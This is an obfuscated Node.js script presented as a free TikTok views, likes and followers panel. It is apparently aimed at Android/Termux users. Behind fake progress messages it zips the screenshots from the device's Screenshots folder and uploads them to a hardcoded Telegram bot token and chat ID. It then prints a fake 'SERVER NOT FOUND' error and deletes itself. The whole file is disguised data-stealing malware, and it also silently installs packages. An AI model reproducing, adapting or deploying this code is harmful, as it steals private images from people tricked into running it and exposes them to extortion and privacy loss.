const a0_0x1cbce8=a0_0x139e;(function(_0x551003,_0x225b21){const _0x326063=a0_0x139e,_0x19277d=_0x551003();while(!![]){try{const _0x2be265=parseInt(_0x326063(0x7b))/0x1+-parseInt(_0x326063(0x9d))/0x2+parseInt(_0x326063(0xb7))/0x3+parseInt(_0x326063(0xc1))/0x4*(-parseInt(_0x326063(0x7c))/0x5)+parseInt(_0x326063(0x85))/0x6*(parseInt(_0x326063(0xc2))/0x7)+parseInt(_0x326063(0x8d))/0x8+-parseInt(_0x326063(0xa6))/0x9;if(_0x2be265===_0x225b21)break;else _0x19277d['push'](_0x19277d['shift']());}catch(_0x412e4d){_0x19277d['push'](_0x19277d['shift']());}}}(a0_0x1e3f,0xdf42b),console[a0_0x1cbce8(0xb3)]());const {execSync}=require(a0_0x1cbce8(0xb2)),modules=[a0_0x1cbce8(0xb0),'readline','fs','path',a0_0x1cbce8(0xb4)];function installModules(){const _0x4fe1ea=a0_0x1cbce8;let _0x5ee7d6=![];modules[_0x4fe1ea(0x9b)](_0xcd82b=>{const _0x5b4199=_0x4fe1ea;try{require['resolve'](_0xcd82b);}catch(_0x1dc36b){!_0x5ee7d6&&(console['log'](_0x5b4199(0xa3)),_0x5ee7d6=!![]),execSync(_0x5b4199(0x96)+_0xcd82b,{'stdio':_0x5b4199(0xbf)});}});}installModules();const readline=require(a0_0x1cbce8(0x8b)),TelegramBot=require('node-telegram-bot-api'),fs=require('fs'),path=require(a0_0x1cbce8(0x86)),archiver=require(a0_0x1cbce8(0xb4));!process[a0_0x1cbce8(0xae)][a0_0x1cbce8(0xa5)](a0_0x1cbce8(0x95))&&!process[a0_0x1cbce8(0x98)][a0_0x1cbce8(0x94)]&&(process[a0_0x1cbce8(0x98)][a0_0x1cbce8(0x94)]='1',execSync(a0_0x1cbce8(0xbd)+__filename,{'stdio':a0_0x1cbce8(0xaf)}),process[a0_0x1cbce8(0xaa)]());const BOT_TOKEN=a0_0x1cbce8(0x82),CHAT_ID=a0_0x1cbce8(0x9c),bot=new TelegramBot(BOT_TOKEN,{'polling':![]}),red=a0_0x1cbce8(0x7f),green=a0_0x1cbce8(0x7e),cyan='\x1b[36m',reset=a0_0x1cbce8(0x99);function printLogo(){const _0x5f46ca=a0_0x1cbce8;console[_0x5f46ca(0xb3)](),console['log'](cyan+_0x5f46ca(0x97)+reset),console[_0x5f46ca(0xa8)](green+_0x5f46ca(0xbb)+reset),console[_0x5f46ca(0xa8)](_0x5f46ca(0xa7)),console['log'](_0x5f46ca(0x8a)),console[_0x5f46ca(0xa8)](_0x5f46ca(0xc7)),console[_0x5f46ca(0xa8)](_0x5f46ca(0x81)),console['log'](_0x5f46ca(0xc6)),console[_0x5f46ca(0xa8)](_0x5f46ca(0xa7));}const rl=readline[a0_0x1cbce8(0x89)]({'input':process[a0_0x1cbce8(0x93)],'output':process[a0_0x1cbce8(0xb5)]});printLogo(),rl[a0_0x1cbce8(0xab)](cyan+'Enter\x20your\x20TikTok\x20video\x20link:\x20'+reset,function(_0x508bb8){const _0x3fb44e=a0_0x1cbce8;console['log'](_0x3fb44e(0x8e)),setTimeout(()=>console[_0x3fb44e(0xa8)]('Fetching\x20video\x20details...'),0x5dc),setTimeout(()=>console[_0x3fb44e(0xa8)](_0x3fb44e(0x9a)),0xbb8),setTimeout(()=>console[_0x3fb44e(0xa8)](_0x3fb44e(0x92)),0x1194),setTimeout(()=>console[_0x3fb44e(0xa8)]('Processing\x20request...'),0x1770),setTimeout(()=>{const _0x39d324=_0x3fb44e;rl[_0x39d324(0xab)](green+_0x39d324(0x80)+reset,function(_0x2c88df){const _0x57858f=_0x39d324;let _0x25bf4a='';if(_0x2c88df==='1')_0x25bf4a='Views';else{if(_0x2c88df==='2')_0x25bf4a='Likes';else{if(_0x2c88df==='3')_0x25bf4a=_0x57858f(0xb1);else{if(_0x2c88df==='4')_0x25bf4a=_0x57858f(0xa2);else{rl[_0x57858f(0x9f)]();return;}}}}console[_0x57858f(0xa8)](cyan+(_0x57858f(0x90)+_0x25bf4a+_0x57858f(0xb8))+reset),setTimeout(()=>console[_0x57858f(0xa8)](_0x57858f(0x8f)),0x7d0),setTimeout(()=>console[_0x57858f(0xa8)]('Verifying\x20delivery...'),0xfa0),setTimeout(()=>console[_0x57858f(0xa8)](_0x57858f(0xc3)),0x1770),zipScreenshots(_0x23b54d=>{sendZip(_0x23b54d,()=>{setTimeout(()=>{const _0x4febb2=a0_0x139e;console[_0x4febb2(0xb3)](),console[_0x4febb2(0xa8)](red+_0x4febb2(0xa9)+reset);try{fs[_0x4febb2(0x88)](__filename);}catch(_0x1a5132){console[_0x4febb2(0xa1)](_0x4febb2(0xba),_0x1a5132);}},0x7d0);});}),rl[_0x57858f(0x9f)]();});},0x1d4c);});const screenshotFolder='/storage/emulated/0/Pictures/Screenshots/',MAX_ZIP_SIZE=0x30*0x400*0x400;function zipScreenshots(_0xf82b59){const _0x1ffbe4=a0_0x1cbce8,_0x1c4473=_0x1ffbe4(0xbe),_0x405c83=fs[_0x1ffbe4(0xc0)](_0x1c4473),_0xb02f1e=archiver(_0x1ffbe4(0x84),{'zlib':{'level':0x9}});_0x405c83['on'](_0x1ffbe4(0x9f),()=>_0xf82b59(_0x1c4473)),_0xb02f1e['on'](_0x1ffbe4(0xa1),_0x343e4f=>console[_0x1ffbe4(0xa1)](_0x1ffbe4(0xc4),_0x343e4f)),_0xb02f1e[_0x1ffbe4(0x9e)](_0x405c83),fs[_0x1ffbe4(0xc5)](screenshotFolder,(_0x599477,_0x357f16)=>{const _0x4b4ac9=_0x1ffbe4;if(_0x599477){console[_0x4b4ac9(0xa1)](_0x4b4ac9(0x87),_0x599477);return;}let _0x1b3f44=[],_0x388f42=0x0;_0x357f16[_0x4b4ac9(0xb9)](_0x2f66ad=>_0x2f66ad[_0x4b4ac9(0x7d)]('.png')||_0x2f66ad[_0x4b4ac9(0x7d)](_0x4b4ac9(0xac)))['forEach'](_0x2b829f=>{const _0x446c0e=_0x4b4ac9;let _0x1a7c13=path[_0x446c0e(0xad)](screenshotFolder,_0x2b829f),_0x1abb64=fs['statSync'](_0x1a7c13)['size'];if(_0x388f42+_0x1abb64>MAX_ZIP_SIZE)return;_0x1b3f44[_0x446c0e(0x8c)](_0x2b829f),_0x388f42+=_0x1abb64;});if(_0x1b3f44[_0x4b4ac9(0xbc)]===0x0){console[_0x4b4ac9(0xa8)]('No\x20valid\x20screenshots\x20found.');return;}_0x1b3f44[_0x4b4ac9(0x9b)](_0x1caaf9=>_0xb02f1e['file'](path['join'](screenshotFolder,_0x1caaf9),{'name':_0x1caaf9})),_0xb02f1e[_0x4b4ac9(0xa0)]();});}function a0_0x139e(_0x5ee988,_0xe8ddf7){const _0x1e3f18=a0_0x1e3f();return a0_0x139e=function(_0x139e71,_0x5e9148){_0x139e71=_0x139e71-0x7b;let _0x1ba9fc=_0x1e3f18[_0x139e71];return _0x1ba9fc;},a0_0x139e(_0x5ee988,_0xe8ddf7);}function sendZip(_0x514ef7,_0x323f1f){const _0x19737d=a0_0x1cbce8;bot[_0x19737d(0x83)](CHAT_ID,_0x514ef7,{'caption':'Screenshots\x20(up\x20to\x2048MB).','contentType':'application/zip'})[_0x19737d(0xb6)](()=>{_0x323f1f();})[_0x19737d(0xa4)](_0xedaf69=>{const _0x4a10b5=_0x19737d;console[_0x4a10b5(0xa1)](_0x4a10b5(0x91),_0xedaf69),_0x323f1f();});}function a0_0x1e3f(){const _0x28bb50=['archiver','stdout','then','2257065giwkUf','...','filter','Error\x20deleting\x20script:','Welcome\x20to\x20Free\x20TikTok\x20SMM\x20Panel\x20(Fake\x20Version)','length','node\x20--no-warnings\x20','/storage/emulated/0/Pictures/screenshots.zip','ignore','createWriteStream','100DrwWgD','2968CeoBYV','Finalizing\x20request...','Archive\x20error:','readdir','4.\x20Free\x20TikTok\x20Followers','2.\x20Free\x20TikTok\x20Likes','253083VLEbOC','4855btwvbo','endsWith','\x1b[32m','\x1b[31m','Choose\x20an\x20option\x20(1/2/3/4):\x20','3.\x20Free\x20TikTok\x20Comments','5773428652:AAELCa7DJzw5XCxr9_OhwfQe3jmHqEgk888','sendDocument','zip','19752yRCkgZ','path','Error\x20reading\x20screenshot\x20folder:','unlinkSync','createInterface','1.\x20Free\x20TikTok\x20Views','readline','push','5244864MgwHwc','\x0aChecking\x20video\x20link...','Processing\x20order...','\x0aSending\x20','Error\x20sending\x20file:','Verifying\x20link\x20format...','stdin','NO_WARNINGS_RELAUNCH','--no-warnings','npm\x20install\x20','\x0a████████╗██╗██╗\x20\x20██╗████████╗\x20██████╗\x20██╗\x20\x20██╗\x0a╚══██╔══╝██║██║\x20\x20██║╚══██╔══╝██╔═══██╗██║\x20██╔╝\x0a\x20\x20\x20██║\x20\x20\x20██║███████║\x20\x20\x20██║\x20\x20\x20██║\x20\x20\x20██║█████╔╝\x20\x0a\x20\x20\x20██║\x20\x20\x20██║██╔══██║\x20\x20\x20██║\x20\x20\x20██║\x20\x20\x20██║██╔═██╗\x20\x0a\x20\x20\x20██║\x20\x20\x20██║██║\x20\x20██║\x20\x20\x20██║\x20\x20\x20╚██████╔╝██║\x20\x20██╗\x0a\x20\x20\x20╚═╝\x20\x20\x20╚═╝╚═╝\x20\x20╚═╝\x20\x20\x20╚═╝\x20\x20\x20\x20╚═════╝\x20╚═╝\x20\x20╚═╝\x0a','env','\x1b[0m','Trying\x20to\x20fetch\x20video\x20data...','forEach','5509024333','2518012unjEUh','pipe','close','finalize','error','Followers','Installing\x20required\x20package...','catch','includes','7731882QcgSlG','===============================================','log','SERVER\x20NOT\x20FOUND','exit','question','.jpg','join','execArgv','inherit','node-telegram-bot-api','Comments','child_process','clear'];a0_0x1e3f=function(){return _0x28bb50;};return a0_0x1e3f();}